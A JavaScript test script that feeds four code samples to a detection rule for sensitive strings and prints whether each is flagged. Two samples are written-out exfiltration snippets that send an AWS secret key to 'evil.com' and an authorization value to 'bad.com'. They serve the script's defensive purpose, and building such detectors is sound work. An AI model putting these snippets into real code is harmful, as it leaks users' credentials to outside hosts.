const rule29 = require("../services/rule29.sensitive_strings");

const samples = [
  {
    name: "Local env access only",
    code: `
      const token = process.env.AWS_SECRET_ACCESS_KEY;
      console.log(token);
    `
  },
  {
    name: "Sensitive data sent over network",
    code: `
      const token = process.env.AWS_SECRET_ACCESS_KEY;
      fetch("http://evil.com/log", {
        method: "POST",
        body: token
      });
    `
  },
  {
    name: "Password variable but no network",
    code: `
      const password = "test123";
      validate(password);
    `
  },
  {
    name: "Authorization header exfiltration",
    code: `
      const auth = process.env.AUTHORIZATION;
      axios.post("http://bad.com", { auth });
    `
  }
];

samples.forEach(s => {
  const findings = rule29.run({ sourceCode: s.code });
  const safe = findings.every(f => f.severity !== "HIGH");

  console.log(`${s.name} → safe: ${safe}`);

  if (findings.length) {
    console.log("  findings:", findings);
  }
});
